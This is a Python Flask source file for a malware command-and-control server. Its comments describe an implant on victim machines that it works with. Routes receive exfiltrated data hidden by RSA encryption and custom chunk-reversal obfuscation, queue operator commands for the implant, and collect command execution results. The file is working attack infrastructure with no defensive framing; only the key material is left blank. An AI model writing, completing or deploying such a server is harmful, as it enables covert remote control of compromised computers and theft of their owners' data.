from flask import Flask, request, jsonify
import base64

from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend

SERVER_PRIVATE_KEY_PEM = b"""-----BEGIN RSA PRIVATE KEY-----
-----END RSA PRIVATE KEY-----"""

CLIENT_PUBLIC_KEY_PEM = b"""-----BEGIN PUBLIC KEY-----
-----END PUBLIC KEY-----"""

def rsa_encrypt(public_key_pem, plaintext):
    public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
    ciphertext = public_key.encrypt(
        plaintext.encode(),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return ciphertext.hex()

def rsa_decrypt(private_key_pem, ciphertext_hex):
    private_key = serialization.load_pem_private_key(private_key_pem, password=None, backend=default_backend())
    ciphertext = bytes.fromhex(ciphertext_hex)
    plaintext = private_key.decrypt(
        ciphertext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return plaintext.decode()

def obfuscate(encoded_str):
    """Split a base64-encoded string into 16-char chunks,
    pad the final chunk with '@' if needed, then reverse the chunk order."""
    chunk_size = 16
    chunks = [encoded_str[i:i+chunk_size] for i in range(0, len(encoded_str), chunk_size)]
    if chunks and len(chunks[-1]) < chunk_size:
        chunks[-1] = chunks[-1].ljust(chunk_size, '@')
    return ''.join(reversed(chunks))

def deobfuscate(obf_str):
    """Reverse the obfuscation: split into 16-char chunks, reverse order,
    and remove trailing '@' from the final chunk."""
    chunk_size = 16
    chunks = [obf_str[i:i+chunk_size] for i in range(0, len(obf_str), chunk_size)]
    chunks = list(reversed(chunks))
    if chunks:
        chunks[-1] = chunks[-1].rstrip('@')
    return ''.join(chunks)

app = Flask(__name__)
COMMAND_FILE = "command.txt"

@app.route('/upload', methods=['POST'])
def upload():
    # Receive encrypted, obfuscated data from the implant.
    encrypted_data = request.form.get('data')
    if encrypted_data:
        try:
            # Decrypt using the server's private key.
            obf_str = rsa_decrypt(SERVER_PRIVATE_KEY_PEM, encrypted_data)
            # Deobfuscate to get the original base64 string.
            original_b64 = deobfuscate(obf_str)
            # Base64-decode to retrieve the exfiltrated data.
            original = base64.b64decode(original_b64.encode()).decode()
            print("Received exfiltrated data:")
            print(original)
        except Exception as e:
            print("Error processing exfiltrated data:", e)
        return jsonify({"status": "success"}), 200
    else:
        return jsonify({"status": "no data received"}), 400

@app.route('/command', methods=['GET'])
def get_command():
    try:
        with open(COMMAND_FILE, "r") as f:
            cmd = f.read().strip()
        # Clear the command file immediately after reading.
        with open(COMMAND_FILE, "w") as f:
            f.write("")
        if cmd:
            # Base64-encode the command.
            b64_cmd = base64.b64encode(cmd.encode()).decode()
            # Obfuscate the encoded command.
            obf_cmd = obfuscate(b64_cmd)
            # Encrypt using the client's public key.
            encrypted_cmd = rsa_encrypt(CLIENT_PUBLIC_KEY_PEM, obf_cmd)
            return jsonify({"command": encrypted_cmd}), 200
        else:
            return jsonify({"command": ""}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/result', methods=['POST'])
def result():
    res = request.form.get('result')
    if res:
        print("Received command execution result:")
        print(res)
        return jsonify({"status": "result received"}), 200
    else:
        return jsonify({"status": "no result received"}), 400

if __name__ == '__main__':
    # Run over HTTPS with cert.pem and key.pem in the same directory.
    app.run(host='0.0.0.0', port=5000, ssl_context=('cert.pem', 'key.pem'))
